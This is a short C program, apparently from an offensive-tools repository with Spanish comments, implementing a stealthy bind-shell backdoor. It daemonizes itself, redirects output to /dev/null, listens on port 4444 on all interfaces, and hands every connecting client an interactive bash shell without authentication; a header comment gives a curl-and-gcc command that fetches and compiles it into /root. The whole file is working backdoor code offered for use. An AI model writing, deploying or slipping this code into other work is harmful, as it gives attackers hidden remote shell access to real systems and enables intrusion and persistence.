//
// curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/BashReversoANetCat5.c > /tmp/BashReversoANetCat5.c; gcc /tmp/BashReversoANetCat5.c -o /root/BashReversoANetCat5
//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0); // Salir del proceso padre

    if (setsid() < 0) exit(1);
    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);

    int fd = open("/dev/null", O_RDWR);
    if (fd >= 0) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        close(fd);
    }

    chdir("/");
    umask(0);
}

int main() {
    daemonize();

    int sockfd, clientfd;
    struct sockaddr_in server_addr;
    char *bash_shell[] = {"/bin/bash", "-i", NULL};
    char *envp[] = {"TERM=xterm", "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) exit(1);

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(4444);

    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) exit(1);
    if (listen(sockfd, 1) < 0) exit(1);

    while (1) {
        clientfd = accept(sockfd, NULL, NULL);
        if (clientfd < 0) continue;

        if (fork() == 0) {  // Proceso hijo: ejecuta bash
            close(sockfd);

            // Redirigir entrada, salida y error al socket
            dup2(clientfd, STDIN_FILENO);
            dup2(clientfd, STDOUT_FILENO);
            dup2(clientfd, STDERR_FILENO);

            // Ejecutar bash con variables de entorno correctas
            execve("/bin/bash", bash_shell, envp);
            exit(0);
        }

        close(clientfd);
    }

    close(sockfd);
    return 0;
}
